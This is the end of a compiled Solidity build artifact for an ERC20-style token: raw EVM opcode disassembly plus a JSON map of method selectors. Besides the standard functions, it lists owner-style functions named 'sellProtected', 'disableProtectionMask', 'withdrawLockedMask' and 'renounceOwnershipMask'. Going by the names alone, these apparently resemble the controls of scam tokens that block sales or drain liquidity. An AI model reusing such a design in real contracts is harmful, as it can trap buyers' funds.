PUSH5 0x6472657373 GASPRICE KECCAK256 PUSH10 0x6E73756666696369656E PUSH21 0x2062616C616E636520666F722063616C6C4F776E61 PUSH3 0x6C654D PUSH2 0x736B GASPRICE KECCAK256 PUSH4 0x616C6C65 PUSH19 0x206973206E6F7420746865206F776E65724552 NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20627572 PUSH15 0x20616D6F756E742065786365656473 KECCAK256 PUSH2 0x6C6C PUSH16 0x77616E63654470B2D701AB4613C8C4CD PUSH14 0x4A3CA6588481F62F32E016C6CABF ADDMOD 0xDB 0x2E 0xE6 DUP6 0xC1 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH3 0x75726E KECCAK256 PUSH7 0x726F6D20746865 KECCAK256 PUSH27 0x65726F206164647265737345524332303A207472616E7366657220 PUSH7 0x726F6D20746865 KECCAK256 PUSH27 0x65726F206164647265737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 0x4F PUSH24 0x6E61626C654D61736B3A206E6577206F776E657220697320 PUSH21 0x6865207A65726F2061646472657373536166654552 NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS KECCAK256 PUSH16 0x7065726174696F6E20646964206E6F74 KECCAK256 PUSH20 0x75636365656445524332303A2064656372656173 PUSH6 0x6420616C6C6F PUSH24 0x616E63652062656C6F77207A65726FA26469706673582212 KECCAK256 0xEA SMOD 0xCF PUSH14 0x7DB49C600AE4B0422182FD590D72 PUSH6 0xA7BDC9F426DB 0xE8 EXTCODESIZE 0xF8 SWAP8 DUP16 0xDC SIGNEXTEND PUSH5 0x736F6C6343 STOP SMOD MOD STOP CALLER SSTORE PUSH15 0x697377617056324C6962726172793A KECCAK256 0x49 DIFFICULTY GASLIMIT 0x4E SLOAD 0x49 NUMBER COINBASE 0x4C 0x5F COINBASE DIFFICULTY DIFFICULTY MSTORE GASLIMIT MSTORE8 MSTORE8 GASLIMIT MSTORE8 "
        },
        "methodIdentifiers": {
          "allowance(address,address)": "dd62ed3e",
          "approve(address,uint256)": "095ea7b3",
          "balanceOf(address)": "70a08231",
          "burn(uint256)": "42966c68",
          "burnFrom(address,uint256)": "79cc6790",
          "decimals()": "313ce567",
          "decreaseAllowance(address,uint256)": "a457c2d7",
          "disableProtectionMask()": "db14f52a",
          "increaseAllowance(address,uint256)": "39509351",
          "liquidityPoolMask()": "30b2bdbb",
          "name()": "06fdde03",
          "ownerMask()": "e960dbf3",
          "protectedMask()": "338cec21",
          "renounceOwnershipMask()": "cc42c111",
          "sellProtected()": "49bfee57",
          "symbol()": "95d89b41",
          "totalSupply()": "18160ddd",
          "transfer(address,uint256)": "a9059cbb",
          "transferFrom(address,address,uint256)": "23b872dd",
          "transferOwnershipMask(address)": "1c399f24",
          "withdrawLockedMask(address,address,uint256)": "c9fa20b6"
        }
      }
    }
  }
}